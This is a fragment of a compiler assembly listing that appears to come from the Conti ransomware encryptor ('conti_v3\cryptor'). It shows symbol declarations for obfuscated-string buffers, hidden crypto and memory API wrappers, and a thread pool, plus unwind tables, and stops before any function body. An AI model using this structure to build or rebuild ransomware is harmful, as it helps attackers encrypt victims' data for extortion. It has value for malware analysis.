PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	??0?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
PUBLIC	?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	??0?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
PUBLIC	?PutFinalTask@threadpool@@YAHH@Z		; threadpool::PutFinalTask
PUBLIC	??0task_info_@@QEAA@XZ				; task_info_::task_info_
PUBLIC	?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z	; ThreadpoolHandler
PUBLIC	?GetCryptoProvider@@YAHPEA_K@Z			; GetCryptoProvider
PUBLIC	?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z	; pCryptAcquireContextA
PUBLIC	?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z		; pCryptImportKey
PUBLIC	?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z	; pWaitForMultipleObjects
PUBLIC	?pVirtualAlloc@@YAPEAXPEAX_KKK@Z		; pVirtualAlloc
PUBLIC	?Start@threadpool@@YAHH@Z			; threadpool::Start
PUBLIC	?IsActive@threadpool@@YAHH@Z			; threadpool::IsActive
PUBLIC	?Create@threadpool@@YAHH_K@Z			; threadpool::Create
PUBLIC	?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask
PUBLIC	?Wait@threadpool@@YAXH@Z			; threadpool::Wait
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PutFinalTask@threadpool@@YAHH@Z DD imagerel $LN33
	DD	imagerel $LN33+53
	DD	imagerel $unwind$?PutFinalTask@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?PutFinalTask@threadpool@@YAHH@Z DD imagerel $LN33+53
	DD	imagerel $LN33+200
	DD	imagerel $chain$1$?PutFinalTask@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?PutFinalTask@threadpool@@YAHH@Z DD imagerel $LN33+200
	DD	imagerel $LN33+213
	DD	imagerel $chain$2$?PutFinalTask@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z DD imagerel $LN1345
	DD	imagerel $LN1345+498
	DD	imagerel $unwind$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCryptoProvider@@YAHPEA_K@Z DD imagerel $LN577
	DD	imagerel $LN577+1721
	DD	imagerel $unwind$?GetCryptoProvider@@YAHPEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z DD imagerel $LN4
	DD	imagerel $LN4+67
	DD	imagerel $unwind$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z DD imagerel $LN4
	DD	imagerel $LN4+65
	DD	imagerel $unwind$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z DD imagerel $LN4
	DD	imagerel $LN4+50
	DD	imagerel $unwind$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Start@threadpool@@YAHH@Z DD imagerel $LN20
	DD	imagerel $LN20+31
	DD	imagerel $unwind$?Start@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?Start@threadpool@@YAHH@Z DD imagerel $LN20+31
	DD	imagerel $LN20+146
	DD	imagerel $chain$1$?Start@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?Start@threadpool@@YAHH@Z DD imagerel $LN20+146
	DD	imagerel $LN20+154
	DD	imagerel $chain$2$?Start@threadpool@@YAHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Create@threadpool@@YAHH_K@Z DD imagerel $LN20
	DD	imagerel $LN20+40
	DD	imagerel $unwind$?Create@threadpool@@YAHH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?Create@threadpool@@YAHH_K@Z DD imagerel $LN20+40
	DD	imagerel $LN20+132
	DD	imagerel $chain$0$?Create@threadpool@@YAHH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?Create@threadpool@@YAHH_K@Z DD imagerel $LN20+132
	DD	imagerel $LN20+161
	DD	imagerel $chain$1$?Create@threadpool@@YAHH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN152
	DD	imagerel $LN152+62
	DD	imagerel $unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN152+62
	DD	imagerel $LN152+131
	DD	imagerel $chain$0$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN152+131
	DD	imagerel $LN152+188
	DD	imagerel $chain$2$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN152+188
	DD	imagerel $LN152+288
	DD	imagerel $chain$3$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN152+288
	DD	imagerel $LN152+439
	DD	imagerel $chain$4$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Wait@threadpool@@YAXH@Z DD imagerel $LN52
	DD	imagerel $LN52+39
	DD	imagerel $unwind$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?Wait@threadpool@@YAXH@Z DD imagerel $LN52+39
	DD	imagerel $LN52+66
	DD	imagerel $chain$1$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?Wait@threadpool@@YAXH@Z DD imagerel $LN52+66
	DD	imagerel $LN52+289
	DD	imagerel $chain$5$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?Wait@threadpool@@YAXH@Z DD imagerel $LN52+289
	DD	imagerel $LN52+341
	DD	imagerel $chain$6$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$?Wait@threadpool@@YAXH@Z DD imagerel $LN52+341
	DD	imagerel $LN52+349
	DD	imagerel $chain$7$?Wait@threadpool@@YAXH@Z
pdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$?Wait@threadpool@@YAXH@Z DD 021H
	DD	imagerel $LN52
	DD	imagerel $LN52+39
	DD	imagerel $unwind$?Wait@threadpool@@YAXH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?Wait@threadpool@@YAXH@Z DD 021H
	DD	imagerel $LN52+39
	DD	imagerel $LN52+66
	DD	imagerel $chain$1$?Wait@threadpool@@YAXH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?Wait@threadpool@@YAXH@Z DD 082221H
	DD	04e422H
	DD	0a541dH
	DD	05d411H
	DD	06c405H
	DD	imagerel $LN52+39
	DD	imagerel $LN52+66
	DD	imagerel $chain$1$?Wait@threadpool@@YAXH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?Wait@threadpool@@YAXH@Z DD 040c21H
	DD	0c740cH
	DD	0b6405H
	DD	imagerel $LN52
	DD	imagerel $LN52+39
	DD	imagerel $unwind$?Wait@threadpool@@YAXH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Wait@threadpool@@YAXH@Z DD 030801H
	DD	0f0046208H
	DD	03002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 021H
	DD	imagerel $LN152
	DD	imagerel $LN152+62
	DD	imagerel $unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 021H
	DD	imagerel $LN152+62
	DD	imagerel $LN152+131
	DD	imagerel $chain$0$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 040a21H
	DD	04e40aH
	DD	0a3405H
	DD	imagerel $LN152+62
	DD	imagerel $LN152+131
	DD	imagerel $chain$0$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 020521H
	DD	0c6405H
	DD	imagerel $LN152
	DD	imagerel $LN152+62
	DD	imagerel $unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 050b01H
	DD	0f007420bH
	DD	07003c005H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?Create@threadpool@@YAHH_K@Z DD 021H
	DD	imagerel $LN20
	DD	imagerel $LN20+40
	DD	imagerel $unwind$?Create@threadpool@@YAHH_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?Create@threadpool@@YAHH_K@Z DD 020521H
	DD	067405H
	DD	imagerel $LN20
	DD	imagerel $LN20+40
	DD	imagerel $unwind$?Create@threadpool@@YAHH_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Create@threadpool@@YAHH_K@Z DD 040a01H
	DD	07340aH
	DD	06006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?Start@threadpool@@YAHH@Z DD 021H
	DD	imagerel $LN20
	DD	imagerel $LN20+31
	DD	imagerel $unwind$?Start@threadpool@@YAHH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?Start@threadpool@@YAHH@Z DD 040c21H
	DD	09740cH
	DD	086405H
	DD	imagerel $LN20
	DD	imagerel $LN20+31
	DD	imagerel $unwind$?Start@threadpool@@YAHH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Start@threadpool@@YAHH@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pVirtualAlloc@@YAPEAXPEAX_KKK@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z DD 040a01H
	DD	08340aH
	DD	07006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetCryptoProvider@@YAHPEA_K@Z DD 071701H
	DD	02b7417H
	DD	02a3417H
	DD	0280117H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z DD 082319H
	DD	0136414H
	DD	0125414H
	DD	0113414H
	DD	07010d214H
	DD	imagerel __GSHandlerCheck
	DD	060H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?PutFinalTask@threadpool@@YAHH@Z DD 021H
	DD	imagerel $LN33
	DD	imagerel $LN33+53
	DD	imagerel $unwind$?PutFinalTask@threadpool@@YAHH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?PutFinalTask@threadpool@@YAHH@Z DD 040f21H
	DD	07540fH
	DD	063405H
	DD	imagerel $LN33
	DD	imagerel $LN33+53
	DD	imagerel $unwind$?PutFinalTask@threadpool@@YAHH@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PutFinalTask@threadpool@@YAHH@Z DD 040a01H
	DD	08640aH
	DD	07006320aH
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Wait@threadpool@@YAXH@Z
_TEXT	SEGMENT
ThreadPoolID$ = 80
?Wait@threadpool@@YAXH@Z PROC				; threadpool::Wait, COMDAT

; 253  : {

$LN52:
